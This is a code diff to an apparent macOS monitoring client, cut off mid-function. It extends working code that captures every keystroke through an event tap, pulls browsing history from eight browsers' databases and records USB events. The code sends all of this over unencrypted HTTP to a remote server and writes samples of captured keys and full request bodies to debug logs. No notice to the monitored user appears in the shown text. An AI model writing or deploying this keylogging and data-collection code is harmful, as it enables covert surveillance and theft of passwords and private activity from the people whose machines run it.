@@ -52,8 +52,11 @@ private let browserBundleIDs = [
 ]
 
 struct BrowserHistoryLog: Codable {
-    let date: String
+    let browser: String
     let url: String
+    let title: String
+    let last_visit: Int64
+    let date: String
 }
 
 struct KeyLog: Codable {
@@ -64,7 +67,10 @@ struct KeyLog: Codable {
 
 struct USBDeviceLog: Codable {
     let date: String
-    let device: String
+    let device_name: String
+    let device_path: String
+    let device_type: String
+    let action: String
 }
 
 // Global callback function for CGEvent tap
@@ -110,11 +116,16 @@ func handleKeyDownCallback(
     appDelegate.logMessage("Key captured: \(keyInfo)", level: .debug)
     appDelegate.keyLogs.append(KeyLog(date: currentDate, application: "\(appName) (\(bundleId))", key: "\(modifiers)\(keyName)"))
     
+    // Log key log count for debugging
+    if appDelegate.keyLogs.count % 10 == 0 {
+        appDelegate.logMessage("Key log count: \(appDelegate.keyLogs.count)", level: .debug)
+    }
+    
     return Unmanaged.passUnretained(event)
 }
 
 @NSApplicationMain
-class AppDelegate: NSObject, NSApplicationDelegate {
+class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDelegate {
     
     var storage: UserDefaults!
     var eventTap: CFMachPort?
@@ -272,6 +283,9 @@ class AppDelegate: NSObject, NSApplicationDelegate {
         } else {
             logMessage("Server IP already configured: \(storage.string(forKey: "server-ip") ?? "unknown")", level: .info)
         }
+        
+        // Reset accessibility prompt flag on startup
+        storage.removeObject(forKey: "accessibility-prompt-shown")
 
         APP_VERSION = Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "Unknown"
 
@@ -296,6 +310,12 @@ class AppDelegate: NSObject, NSApplicationDelegate {
         
         // Start keyboard monitoring
         logMonitoringEvent("Starting keyboard monitoring")
+        
+        // Check if app has proper entitlements
+        if let bundleIdentifier = Bundle.main.bundleIdentifier {
+            logMessage("App bundle identifier: \(bundleIdentifier)", level: .debug)
+        }
+        
         startKeyboardMonitoring();
         
         // Setup event tap invalidation monitoring
@@ -323,6 +343,24 @@ class AppDelegate: NSObject, NSApplicationDelegate {
         logMonitoringEvent("Setting up USB monitoring")
         setupUSBMonitoring()
         
+        // Test server connectivity on startup
+        DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
+            self.testServerConnectivity()
+        }
+        
+        // Debug accessibility status on startup
+        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
+            self.debugAccessibilityStatus()
+        }
+        
+        // Check app entitlements on startup
+        DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
+            self.checkAppEntitlements()
+        }
+        
+        // Set up notification delegate
+        NSUserNotificationCenter.default.delegate = self
+        
         logSuccess("MonitorClient initialization complete")
     }
     
@@ -338,6 +376,12 @@ class AppDelegate: NSObject, NSApplicationDelegate {
 
     @objc func checkAllTasks() {
         let currentDate = Date()
+        
+        // Check accessibility permission periodically
+        checkAccessibilityPermissionPeriodically()
+        
+        // Add event tap validation check to main timer loop
+        checkAndReestablishEventTapThrottled()
                 
         // Check if it's time for screenshots
         if currentDate.timeIntervalSince(lastScreenshotCheck) >= TimeInterval(TIME_INTERVAL) {
@@ -362,30 +406,22 @@ class AppDelegate: NSObject, NSApplicationDelegate {
 
         // Check if it's time for browser history
         if currentDate.timeIntervalSince(lastHistoryCheck) >= TimeInterval(HISTORY_INTERVAL) {
-            if (lastBrowserTic != nil) {
-                logMonitoringEvent("Browser history monitoring triggered", details: "Interval: \(HISTORY_INTERVAL)s")
-                DispatchQueue.global(qos: .background).async {
-                    do {
-                        try self.sendBrowserHistories()
-                    } catch {
-                        self.logError("Error sending browser histories: \(error)", context: "BrowserHistory")
-                    }
+            logMonitoringEvent("Browser history monitoring triggered", details: "Interval: \(HISTORY_INTERVAL)s")
+            DispatchQueue.global(qos: .background).async {
+                do {
+                    try self.sendBrowserHistories()
+                } catch {
+                    self.logError("Error sending browser histories: \(error)", context: "BrowserHistory")
                 }
-                lastHistoryCheck = currentDate
-            } else {
-                logMessage("Browser history monitoring skipped - no lastBrowserTic", level: .debug)
             }
+            lastHistoryCheck = currentDate
         }
 
         // Check if it's time for key log
         if currentDate.timeIntervalSince(lastKeyCheck) >= TimeInterval(KEY_INTERVAL) {
             logMonitoringEvent("Key log monitoring triggered", details: "Interval: \(KEY_INTERVAL)s, Keys collected: \(keyLogs.count)")
             DispatchQueue.global(qos: .background).async {
-                do {
-                    try self.sendKeyLogs()
-                } catch {
-                    self.logError("Error sending key logs: \(error)", context: "KeyLog")
-                }
+                self.sendKeyLogs()
             }
             logMonitoringEvent("USB log monitoring triggered", details: "USB events collected: \(usbDeviceLogs.count)")
             DispatchQueue.global(qos: .background).async {
@@ -417,17 +453,26 @@ class AppDelegate: NSObject, NSApplicationDelegate {
         
         // Prevent multiple simultaneous re-establishment attempts
         guard !isReestablishingEventTap else {
-            debugPrint("Event tap re-establishment already in progress, skipping check")
+            return
+        }
+        
+        // Additional check: only re-establish if we have accessibility permission
+        guard isInputMonitoringEnabled() else {
+            // Don't log this message repeatedly to avoid spam
+            let lastSkipLog = storage.double(forKey: "last-skip-log-time")
+            let currentTime = Date().timeIntervalSince1970
+            if currentTime - lastSkipLog > 30 { // Only log every 30 seconds
+                logMessage("Skipping event tap check - no accessibility permission", level: .debug)
+                storage.set(currentTime, forKey: "last-skip-log-time")
+            }
             return
         }
         
         lastEventTapCheck = currentDate
         
-        // Log the reason for checking
-        if shouldCheckKeyGap {
-            debugPrint("No key capture detected for \(Int(keyCaptureGap))s, checking event tap...")
-        } else {
-            debugPrint("Regular event tap validation check...")
+        // Log the reason for checking (but less frequently)
+        if shouldCheckKeyGap && keyCaptureGap.truncatingRemainder(dividingBy: 30) < 1 {
+            logMessage("No key capture detected for \(Int(keyCaptureGap))s, checking event tap...", level: .debug)
         }
         
         // Perform the check asynchronously to avoid blocking the main thread
@@ -440,7 +485,7 @@ class AppDelegate: NSObject, NSApplicationDelegate {
     private func performEventTapValidation() {
         // Quick check first - if event tap is nil, we need to re-establish
         guard let tap = eventTap else {
-            debugPrint("Event tap is nil, re-establishing...")
+            logMessage("Event tap is nil, re-establishing...", level: .info)
             reestablishEventTapAsync()
             return
         }
@@ -448,7 +493,7 @@ class AppDelegate: NSObject, NSApplicationDelegate {
         // Check if tap is enabled (this is a lightweight operation)
         let isEnabled = CGEvent.tapIsEnabled(tap: tap)
         if !isEnabled {
-            debugPrint("Event tap became disabled, re-establishing...")
+            logMessage("Event tap became disabled, re-establishing...", level: .info)
             reestablishEventTapAsync()
             return
         }
@@ -456,12 +501,13 @@ class AppDelegate: NSObject, NSApplicationDelegate {
         // Additional validation: check if mach port is still valid
         let portValid = CFMachPortIsValid(tap)
         if !portValid {
-            debugPrint("Event tap mach port is invalid, re-establishing...")
+            logMessage("Event tap mach port is invalid, re-establishing...", level: .info)
             reestablishEventTapAsync()
             return
         }
         
-        debugPrint("Event tap validation passed")
+        // Event tap is valid and working
+        // logMessage("Event tap validation passed", level: .debug)
     }
     
     /// Re-establish event tap asynchronously with timeout
@@ -471,7 +517,7 @@ class AppDelegate: NSObject, NSApplicationDelegate {
         // Set a timeout to prevent infinite hanging
         let timeoutWorkItem = DispatchWorkItem { [weak self] in
             self?.isReestablishingEventTap = false
-            self?.debugPrint("Event tap re-establishment timed out")
+            self?.logMessage("Event tap re-establishment timed out", level: .warning)
         }
         
         DispatchQueue.main.asyncAfter(deadline: .now() + 10.0, execute: timeoutWorkItem)
@@ -485,19 +531,28 @@ class AppDelegate: NSObject, NSApplicationDelegate {
                 timeoutWorkItem.cancel()
             }
             
+            // Check permission before attempting to re-establish
+            guard self.isInputMonitoringEnabled() else {
+                self.logMessage("Cannot re-establish event tap - no accessibility permission", level: .warning)
+                return
+            }
+            
             do {
                 self.setupKeyboardMonitoring()
-                self.debugPrint("Event tap re-establishment completed successfully")
+                self.logMessage("Event tap re-establishment completed successfully", level: .info)
             } catch {
-                self.debugPrint("Event tap re-establishment failed: \(error)")
+                self.logMessage("Event tap re-establishment failed: \(error)", level: .error)
             }
         }
     }
 
     func buildEndpoint(_ mode: Bool) -> String? {
         if let ip = storage.string(forKey: "server-ip"), !ip.isEmpty {
-            return "http://" + ip + (mode ? API_ROUTE : TIC_ROUTE)
+            let endpoint = "http://" + ip + (mode ? API_ROUTE : TIC_ROUTE)
+            logMessage("Built endpoint: \(endpoint)", level: .debug)
+            return endpoint
         } else {
+            logError("Server IP not configured", context: "Endpoint")
             return nil
         }
     }
@@ -626,7 +681,7 @@ class AppDelegate: NSObject, NSApplicationDelegate {
                         
                         // Initialize timestamp if needed
                         if highestTimestamp == nil {
-                            let currentDate = Date(timeIntervalSince1970: lastBrowserTic)
+                            let currentDate = Date(timeIntervalSince1970: lastBrowserTic ?? Date().timeIntervalSince1970 - 86400) // Default to 24 hours ago
                             highestTimestamp = (Int64(currentDate.timeIntervalSince1970) + 11644473600) * 1000000
                         }
                         
@@ -651,7 +706,13 @@ class AppDelegate: NSObject, NSApplicationDelegate {
                                     highestTimestamp = visitTime
                                 }
                                 
-                                browseHist.append(BrowserHistoryLog(date: visitDate, url: histURL))
+                                browseHist.append(BrowserHistoryLog(
+                                    browser: browser,
+                                    url: histURL,
+                                    title: histURL, // Use URL as title for now
+                                    last_visit: visitTime,
+                                    date: getCurrentDateTimeString()
+                                ))
                             }
                             
                             sqlite3_finalize(queryStatement)
@@ -735,7 +796,7 @@ class AppDelegate: NSObject, NSApplicationDelegate {
             sqlite3_finalize(headerCheck)
             
             if safariChecked == nil{
-                let currentDate = Date(timeIntervalSince1970: lastBrowserTic!)
+                let currentDate = Date(timeIntervalSince1970: lastBrowserTic ?? Date().timeIntervalSince1970 - 86400) // Default to 24 hours ago
                 safariChecked = currentDate.timeIntervalSince1970 - 978307200
             }
             // Convert timestamp to VLAT timestring
@@ -758,7 +819,13 @@ class AppDelegate: NSObject, NSApplicationDelegate {
                         safariChecked = visitTime
                     }
 
-                    browseHist.append(BrowserHistoryLog(date: visitDate, url: histURL))
+                    browseHist.append(BrowserHistoryLog(
+                        browser: "Safari",
+                        url: histURL,
+                        title: histURL, // Use URL as title for now
+                        last_visit: Int64(visitTime),
+                        date: getCurrentDateTimeString()
+                    ))
                 }
                 sqlite3_finalize(queryStatement)
             } else {
@@ -780,7 +847,7 @@ class AppDelegate: NSObject, NSApplicationDelegate {
     func getChromeHistories() throws -> [BrowserHistoryLog]? {
         let username = NSUserName()
         let chromeProfilesPath = "/Users/\(username)/Library/Application Support/Google/Chrome/"
-        return try processChromeBasedProfiles(profilesPath: chromeProfilesPath, browser: "Chrome", checkedVariable: &chromeChecked, lastBrowserTic: lastBrowserTic!)
+        return try processChromeBasedProfiles(profilesPath: chromeProfilesPath, browser: "Chrome", checkedVariable: &chromeChecked, lastBrowserTic: lastBrowserTic ?? Date().timeIntervalSince1970 - 86400)
     }
 
     func getFirefoxHistories() throws -> [BrowserHistoryLog]? {
@@ -845,7 +912,7 @@ class AppDelegate: NSObject, NSApplicationDelegate {
                     sqlite3_finalize(headerCheck)
                     
                     if firefoxChecked == nil{
-                        let currentDate = Date(timeIntervalSince1970: lastBrowserTic!)
+                        let currentDate = Date(timeIntervalSince1970: lastBrowserTic ?? Date().timeIntervalSince1970 - 86400) // Default to 24 hours ago
                         firefoxChecked = Int64(currentDate.timeIntervalSince1970 * 1000000)
                     }
 
@@ -870,7 +937,13 @@ class AppDelegate: NSObject, NSApplicationDelegate {
                                 firefoxChecked = visitTime
                             }
 
-                            browseHist.append(BrowserHistoryLog(date: visitDate, url: histURL))
+                            browseHist.append(BrowserHistoryLog(
+                                browser: "Firefox",
+                                url: histURL,
+                                title: histURL, // Use URL as title for now
+                                last_visit: visitTime,
+                                date: getCurrentDateTimeString()
+                            ))
                         }
 
                         sqlite3_finalize(queryStatement)
@@ -892,31 +965,31 @@ class AppDelegate: NSObject, NSApplicationDelegate {
     func getEdgeHistories() throws -> [BrowserHistoryLog]? {
         let username = NSUserName()
         let edgeProfilesPath = "/Users/\(username)/Library/Application Support/Microsoft Edge/"
-        return try processChromeBasedProfiles(profilesPath: edgeProfilesPath, browser: "Edge", checkedVariable: &edgeChecked, lastBrowserTic: lastBrowserTic!)
+        return try processChromeBasedProfiles(profilesPath: edgeProfilesPath, browser: "Edge", checkedVariable: &edgeChecked, lastBrowserTic: lastBrowserTic ?? Date().timeIntervalSince1970 - 86400)
     }
     
     func getOperaHistories() throws -> [BrowserHistoryLog]? {
         let username = NSUserName()
         let operaProfilesPath = "/Users/\(username)/Library/Application Support/com.operasoftware.Opera/"
-        return try processChromeBasedProfiles(profilesPath: operaProfilesPath, browser: "Opera", checkedVariable: &operaChecked, lastBrowserTic: lastBrowserTic!)
+        return try processChromeBasedProfiles(profilesPath: operaProfilesPath, browser: "Opera", checkedVariable: &operaChecked, lastBrowserTic: lastBrowserTic ?? Date().timeIntervalSince1970 - 86400)
     }
     
     func getYandexHistories() throws -> [BrowserHistoryLog]? {
         let username = NSUserName()
         let yandexProfilesPath = "/Users/\(username)/Library/Application Support/Yandex/YandexBrowser/"
-        return try processChromeBasedProfiles(profilesPath: yandexProfilesPath, browser: "Yandex", checkedVariable: &yandexChecked, lastBrowserTic: lastBrowserTic!)
+        return try processChromeBasedProfiles(profilesPath: yandexProfilesPath, browser: "Yandex", checkedVariable: &yandexChecked, lastBrowserTic: lastBrowserTic ?? Date().timeIntervalSince1970 - 86400)
     }
     
     func getVivaldiHistories() throws -> [BrowserHistoryLog]? {
         let username = NSUserName()
         let vivaldiProfilesPath = "/Users/\(username)/Library/Application Support/Vivaldi/"
-        return try processChromeBasedProfiles(profilesPath: vivaldiProfilesPath, browser: "Vivaldi", checkedVariable: &vivaldiChecked, lastBrowserTic: lastBrowserTic!)
+        return try processChromeBasedProfiles(profilesPath: vivaldiProfilesPath, browser: "Vivaldi", checkedVariable: &vivaldiChecked, lastBrowserTic: lastBrowserTic ?? Date().timeIntervalSince1970 - 86400)
     }
     
     func getBraveHistories() throws -> [BrowserHistoryLog]? {
         let username = NSUserName()
         let braveProfilesPath = "/Users/\(username)/Library/Application Support/BraveSoftware/Brave-Browser/"
-        return try processChromeBasedProfiles(profilesPath: braveProfilesPath, browser: "Brave", checkedVariable: &braveChecked, lastBrowserTic: lastBrowserTic!)
+        return try processChromeBasedProfiles(profilesPath: braveProfilesPath, browser: "Brave", checkedVariable: &braveChecked, lastBrowserTic: lastBrowserTic ?? Date().timeIntervalSince1970 - 86400)
     }
     
     func getBrowserHistories() throws -> [BrowserHistoryLog]? {
@@ -1113,16 +1186,26 @@ class AppDelegate: NSObject, NSApplicationDelegate {
     }
 
     @objc func sendKeyLogs() {
+        logMessage("sendKeyLogs called - keyLogs count: \(keyLogs.count)", level: .debug)
+        
         if self.keyLogs.count > 0 {
             logMonitoringEvent("Sending key logs", details: "Count: \(keyLogs.count)")
-            do {
-                // Send data in chunks
-                sendDataInChunks(data: self.keyLogs, eventType: "KeyLog", chunkSize: 500)
-                self.keyLogs.removeAll()
-                logSuccess("Key logs sent and cleared", details: "\(keyLogs.count) keys")
-            } catch {
-                logError("Error converting key logs to JSON: \(error)", context: "KeyLog")
+            
+            // Log a sample of the key logs for debugging
+            let sampleCount = min(3, keyLogs.count)
+            for i in 0..<sampleCount {
+                let log = keyLogs[i]
+                logMessage("Sample key log \(i+1): \(log.date) - \(log.application) - \(log.key)", level: .debug)
             }
+            
+            // Test server connectivity before sending
+            logMessage("Testing server connectivity before sending key logs...", level: .debug)
+            testServerConnectivity()
+            
+            // Send data in chunks
+            sendDataInChunks(data: self.keyLogs, eventType: "KeyLog", chunkSize: 500)
+            self.keyLogs.removeAll()
+            logSuccess("Key logs sent and cleared", details: "\(keyLogs.count) keys")
         } else {
             logMessage("No key logs to send", level: .debug)
         }
@@ -1315,20 +1398,40 @@ class AppDelegate: NSObject, NSApplicationDelegate {
     private func startKeyboardMonitoring() {
         // Check permission before starting monitoring
         if isInputMonitoringEnabled() {
+            logMessage("Accessibility permission already granted, starting keyboard monitoring", level: .info)
             setupKeyboardMonitoring()
         } else {
             // Start a timer to periodically check for permission
-            self.debugPrint("Checking Keyboard Permission")
-            requestAccessibilityPermission();
+            logMessage("Accessibility permission not granted, requesting access", level: .info)
+            requestAccessibilityPermission()
+            
+            // Use a more robust permission checking mechanism
+            var permissionCheckCount = 0
+            let maxPermissionChecks = 60 // Check for up to 60 seconds
+            
             Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { [weak self] timer in
-                self?.debugPrint("Checking Keyboard Permission 1")
-                if self?.isInputMonitoringEnabled() == true {
-                    // Permission granted, start monitoring
-                    self?.debugPrint("Permission granted, starting keyboard monitoring")
-                    self?.setupKeyboardMonitoring()
+                guard let self = self else {
                     timer.invalidate()
+                    return
                 }
-                self?.keyLogs.append(KeyLog(date: self?.getCurrentDateTimeString() ?? "", application: "", key: "Permission not granted"))
+                
+                permissionCheckCount += 1
+                
+                if self.isInputMonitoringEnabled() {
+                    // Permission granted, start monitoring
+                    self.logMessage("Accessibility permission granted after \(permissionCheckCount) seconds, starting keyboard monitoring", level: .info)
+                    self.setupKeyboardMonitoring()
+                    timer.invalidate()
+                } else if permissionCheckCount >= maxPermissionChecks {
+                    // Give up after max attempts
+                    self.logError("Accessibility permission not granted after \(maxPermissionChecks) seconds, giving up", context: "Permission")
+                    timer.invalidate()
+                } else if permissionCheckCount % 10 == 0 {
+                    // Log progress every 10 seconds
+                    self.logMessage("Still waiting for accessibility permission... (\(permissionCheckCount)s)", level: .info)
+                }
+                
+                // Don't add permission denied logs to keyLogs as it floods the logs
             }
         }
     }
@@ -1474,21 +1577,50 @@ class AppDelegate: NSObject, NSApplicationDelegate {
     }
 
     private func requestAccessibilityPermission() {
+        // First check if we already have permission without prompting
+        if AXIsProcessTrusted() {
+            logMessage("Accessibility permission already granted", level: .info)
+            return
+        }
+        
+        // Only prompt once per session to avoid spam
+        let promptKey = "accessibility-prompt-shown"
+        if storage.bool(forKey: promptKey) {
+            logMessage("Accessibility prompt already shown this session, skipping", level: .info)
+            return
+        }
+        
+        logMessage("Requesting accessibility permission...", level: .info)
+        logMessage("Please go to System Preferences > Security & Privacy > Privacy > Accessibility and add this app", level: .info)
+        
         let options = [kAXTrustedCheckOptionPrompt.takeUnretainedValue(): true]
         let trusted = AXIsProcessTrustedWithOptions(options as CFDictionary)
         
         if trusted {
-            print("Accessibility permission granted")
+            logMessage("Accessibility permission granted", level: .info)
         } else {
-            print("Accessibility permission denied")
+            logMessage("Accessibility permission denied - please check System Preferences", level: .warning)
         }
+        
+        // Mark that we've shown the prompt
+        storage.set(true, forKey: promptKey)
     }
     
     private func isInputMonitoringEnabled() -> Bool {
-        debugPrint("Checking Input Monitoring Permission")
         // Check if we have accessibility permissions
         let trusted = AXIsProcessTrusted()
-        debugPrint("Accessibility trusted: \(trusted)")
+        
+        // Only log when permission status changes to avoid spam
+        let lastTrustedState = storage.bool(forKey: "last-accessibility-trusted")
+        if trusted != lastTrustedState {
+            if trusted {
+                logMessage("Accessibility permission status changed: GRANTED", level: .info)
+            } else {
+                logMessage("Accessibility permission status changed: DENIED", level: .warning)
+            }
+            storage.set(trusted, forKey: "last-accessibility-trusted")
+        }
+        
         return trusted
     }
 
@@ -1554,7 +1686,13 @@ class AppDelegate: NSObject, NSApplicationDelegate {
         while device != 0 {
             if let deviceName = getUSBDeviceName(device) {
                 let currentDate = getCurrentDateTimeString()
-                usbDeviceLogs.append(USBDeviceLog(date: currentDate, device: "Connected: \(deviceName)"))
+                usbDeviceLogs.append(USBDeviceLog(
+                    date: currentDate, 
+                    device_name: deviceName,
+                    device_path: "USB Device Path",
+                    device_type: "USB Device",
+                    action: "Connected"
+                ))
                 debugPrint("USB Device Connected: \(deviceName)")
             }
             IOObjectRelease(device)
@@ -1567,7 +1705,13 @@ class AppDelegate: NSObject, NSApplicationDelegate {
         while device != 0 {
             if let deviceName = getUSBDeviceName(device) {
                 let currentDate = getCurrentDateTimeString()
-                usbDeviceLogs.append(USBDeviceLog(date: currentDate, device: "Disconnected: \(deviceName)"))
+                usbDeviceLogs.append(USBDeviceLog(
+                    date: currentDate, 
+                    device_name: deviceName,
+                    device_path: "USB Device Path",
+                    device_type: "USB Device",
+                    action: "Disconnected"
+                ))
                 debugPrint("USB Device Disconnected: \(deviceName)")
             }
             IOObjectRelease(device)
@@ -1622,26 +1766,7 @@ class AppDelegate: NSObject, NSApplicationDelegate {
         }
     }
 
-    func convertBrowserHistoryToJSONString(_ browseHist: [BrowserHistoryLog]) throws -> String {
-        let encoder = JSONEncoder()
-        let jsonData = try encoder.encode(browseHist)
-        print(jsonData)
-        return String(data: jsonData, encoding: .utf8) ?? ""
-    }
 
-    func convertKeyLogToJSONString(_ keyLogs: [KeyLog]) throws -> String {
-        let encoder = JSONEncoder()
-        let jsonData = try encoder.encode(keyLogs)
-        print(jsonData)
-        return String(data: jsonData, encoding: .utf8) ?? ""
-    }
-    
-    func convertUSBLogToJSONString(_ usbLogs: [USBDeviceLog]) throws -> String {
-        let encoder = JSONEncoder()
-        let jsonData = try encoder.encode(usbLogs)
-        print(jsonData)
-        return String(data: jsonData, encoding: .utf8) ?? ""
-    }
 
     private func sendDataInChunks(data: [Any], eventType: String, chunkSize: Int = 1000) {
         guard let urlString = buildEndpoint(false), let url = URL(string: urlString) else {
@@ -1650,9 +1775,9 @@ class AppDelegate: NSObject, NSApplicationDelegate {
             return
         }
         
-        if eventType == "BrowserHistory" {
-            logMessage("Total browser history entries to send: \(data.count)", level: .debug)
-        }
+        logMessage("=== Sending \(eventType) Data ===", level: .info)
+        logMessage("Endpoint: \(urlString)", level: .info)
+        logMessage("Total data items: \(data.count)", level: .info)
         
         // Create chunks properly
         var chunks: [[Any]] = []
@@ -1667,66 +1792,120 @@ class AppDelegate: NSObject, NSApplicationDelegate {
         for (index, chunk) in chunks.enumerated() {
             let chunkData = chunk
             
-            // Use the correct field name for each data type
+            // Use the correct field name for each data type (matching Windows format)
             var postData: [String: Any] = [
                 "Event": eventType,
                 "Version": APP_VERSION,
                 "MacAddress": macAddress
             ]
 
-            do {
-                switch eventType {
-                case "BrowserHistory":
-                    postData["BrowserHistories"] = try convertBrowserHistoryToJSONString(chunkData as! [BrowserHistoryLog])
-                case "KeyLog":
-                    postData["KeyLogs"] = try convertKeyLogToJSONString(chunkData as! [KeyLog])
-                case "USBLog":
-                    postData["USBLogs"] = try convertUSBLogToJSONString(chunkData as! [USBDeviceLog])
-                default:
-                    postData["Data"] = chunkData
+            // Convert Swift structs to dictionaries (matching Windows JSON format)
+            switch eventType {
+            case "BrowserHistory":
+                let historyArray = chunkData.map { (item: Any) -> [String: Any] in
+                    if let history = item as? BrowserHistoryLog {
+                        return [
+                            "browser": history.browser,
+                            "url": history.url,
+                            "title": history.title,
+                            "last_visit": history.last_visit,
+                            "date": history.date
+                        ]
+                    }
+                    return [:]
                 }
+                postData["BrowserHistories"] = historyArray
+                
+            case "KeyLog":
+                let keyLogArray = chunkData.map { (item: Any) -> [String: Any] in
+                    if let keyLog = item as? KeyLog {
+                        return [
+                            "date": keyLog.date,
+                            "application": keyLog.application,
+                            "key": keyLog.key
+                        ]
+                    }
+                    return [:]
+                }
+                postData["KeyLogs"] = keyLogArray
+                
+            case "USBLog":
+                let usbLogArray = chunkData.map { (item: Any) -> [String: Any] in
+                    if let usbLog = item as? USBDeviceLog {
+                        return [
+                            "date": usbLog.date,
+                            "device_name": usbLog.device_name,
+                            "device_path": usbLog.device_path,
+                            "device_type": usbLog.device_type,
+                            "action": usbLog.action
+                        ]
+                    }
+                    return [:]
+                }
+                postData["USBLogs"] = usbLogArray
+                
+            default:
+                postData["Data"] = chunkData
+            }
 
-                logMessage("\(eventType) chunk \(index + 1)/\(chunks.count) data prepared", level: .debug)
-                
-                // Convert to JSON
-                guard let jsonData = try? JSONSerialization.data(withJSONObject: postData) else {
-                    logError("Failed to serialize JSON data for \(eventType) chunk \(index + 1)", context: eventType)
-                    continue
-                }
-                
-                // Create request
-                var request = URLRequest(url: url)
-                request.httpMethod = "POST"
-                request.setValue("application/json", forHTTPHeaderField: "Content-Type")
-                request.httpBody = jsonData
-                
-                logMessage("Sending \(eventType) chunk \(index + 1)/\(chunks.count) to: \(urlString)", level: .debug)
-                
-                // Send request
-                let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
-                    DispatchQueue.main.async {
-                        if let error = error {
-                            self?.logError("\(eventType) chunk \(index + 1)/\(chunks.count) network error: \(error)", context: eventType)
-                            return
-                        }
+            logMessage("\(eventType) chunk \(index + 1)/\(chunks.count) data prepared", level: .debug)
+            
+            // Convert to JSON
+            guard let jsonData = try? JSONSerialization.data(withJSONObject: postData) else {
+                logError("Failed to serialize JSON data for \(eventType) chunk \(index + 1)", context: eventType)
+                continue
+            }
+            
+            // Create request
+            var request = URLRequest(url: url)
+            request.httpMethod = "POST"
+            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+            request.setValue("MonitorClient/\(APP_VERSION)", forHTTPHeaderField: "User-Agent")
+            request.timeoutInterval = 30.0
+            request.httpBody = jsonData
+            
+            logMessage("Sending \(eventType) chunk \(index + 1)/\(chunks.count) to: \(urlString)", level: .debug)
+            logMessage("Request body size: \(jsonData.count) bytes", level: .debug)
+            logMessage("Request headers: \(request.allHTTPHeaderFields ?? [:])", level: .debug)
+            
+            // Log the actual JSON being sent for debugging
+            if let jsonString = String(data: jsonData, encoding: .utf8) {
+                logMessage("Request JSON: \(jsonString)", level: .debug)
+            }
+            
+            // Send request
+            let task = URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
+                DispatchQueue.main.async {
+                    if let error = error {
+                        self?.logError("\(eventType) chunk \(index + 1)/\(chunks.count) network error: \(error)", context: eventType)
+                        self?.logError("Error details: \(error.localizedDescription)", context: eventType)
+                        return
+                    }
+                    
+                    if let httpResponse = response as? HTTPURLResponse {
+                        self?.logMessage("\(eventType) chunk \(index + 1)/\(chunks.count) HTTP response: \(httpResponse.statusCode)", level: .debug)
+                        self?.logMessage("Response headers: \(httpResponse.allHeaderFields)", level: .debug)
                         
-                        if let httpResponse = response as? HTTPURLResponse {
-                            self?.logMessage("\(eventType) chunk \(index + 1)/\(chunks.count) HTTP response: \(httpResponse.statusCode)", level: .debug)
+                        if httpResponse.statusCode != 200 {
+                            self?.logError("\(eventType) chunk \(index + 1)/\(chunks.count) HTTP error: \(httpResponse.statusCode)", context: eventType)
                         }
-                        
-                        if let data = data, let responseString = String(data: data, encoding: .utf8) {
-                            self?.logSuccess("\(eventType) chunk \(index + 1)/\(chunks.count) sent successfully", details: "Response: \(responseString)")
-                        } else {
-                            self?.logError("No response data received for \(eventType) chunk \(index + 1)/\(chunks.count)", context: eventType)
+                    }
+                    
+                    if let data = data, let responseString = String(data: data, encoding: .utf8) {
+                        self?.logSuccess("\(eventType) chunk \(index + 1)/\(chunks.count) sent successfully", details: "Response: \(responseString)")
+                        self?.logMessage("Response data size: \(data.count) bytes", level: .debug)
+                    } else {
+                        self?.logError("No response data received for \(eventType) chunk \(index + 1)/\(chunks.count)", context: eventType)
+                        if let data = data {
+                            self?.logMessage("Raw response data: \(data)", level: .debug)
                         }
                     }
                 }
-                task.resume()
-                
-            } catch {
-                logError("Error converting \(eventType) chunk \(index + 1) to JSON: \(error)", context: eventType)
             }
+            task.resume()
         }
+        
+        logMessage("=== End Sending \(eventType) Data ===", level: .info)
     }
     
     // Helper function to generate random string
@@ -1844,6 +2023,530 @@ class AppDelegate: NSObject, NSApplicationDelegate {
         // Force check event tap validity after system events
         DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
             self.checkAndReestablishEventTapThrottled()
+        }
+    }
+    
+    // Test method to manually trigger key log sending
+    @objc func testSendKeyLogs() {
+        logMessage("Manual key log test triggered", level: .info)
+        sendKeyLogs()
+    }
+    
+    // Reset accessibility permissions for testing
+    @objc func resetAccessibilityPermissions() {
+        logMessage("Resetting accessibility permission flags", level: .info)
+        storage.removeObject(forKey: "accessibility-prompt-shown")
+        storage.removeObject(forKey: "last-accessibility-trusted")
+        storage.removeObject(forKey: "last-skip-log-time")
+        logMessage("Accessibility permission flags reset", level: .info)
+    }
+    
+    // Force request accessibility permission
+    @objc func forceRequestAccessibilityPermission() {
+        logMessage("Force requesting accessibility permission", level: .info)
+        storage.removeObject(forKey: "accessibility-prompt-shown")
+        requestAccessibilityPermission()
+    }
+    
+    // Open System Preferences to Accessibility settings
+    @objc func openAccessibilityPreferences() {
+        logMessage("Opening System Settings to Accessibility settings", level: .info)
+        
+        // Try multiple approaches to open System Settings
+        let approaches = [
+            // Approach 1: Direct URL scheme (works on macOS 13+)
+            { () -> Bool in
+                if let url = URL(string: "x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility") {
+                    NSWorkspace.shared.open(url)
+                    return true
+                }
+                return false
+            },
+            
+            // Approach 2: Try System Settings (macOS 13+)
+            { () -> Bool in
+                let script = """
+                tell application "System Settings"
+                    activate
+                    set current pane to pane id "com.apple.preference.security"
+                    reveal anchor "Privacy_Accessibility"
+                end tell
+                """
+                
+                if let scriptObject = NSAppleScript(source: script) {
+                    var error: NSDictionary?
+                    scriptObject.executeAndReturnError(&error)
+                    
+                    if error == nil {
+                        return true
+                    }
+                }
+                return false
+            },
+            
+            // Approach 3: Try System Preferences (older macOS)
+            { () -> Bool in
+                let script = """
+                tell application "System Preferences"
+                    activate
+                    set current pane to pane id "com.apple.preference.security"
+                    reveal anchor "Privacy_Accessibility"
+                end tell
+                """
+                
+                if let scriptObject = NSAppleScript(source: script) {
+                    var error: NSDictionary?
+                    scriptObject.executeAndReturnError(&error)
+                    
+                    if error == nil {
+                        return true
+                    }
+                }
+                return false
+            },
+            
+            // Approach 4: Just open System Settings/Preferences
+            { () -> Bool in
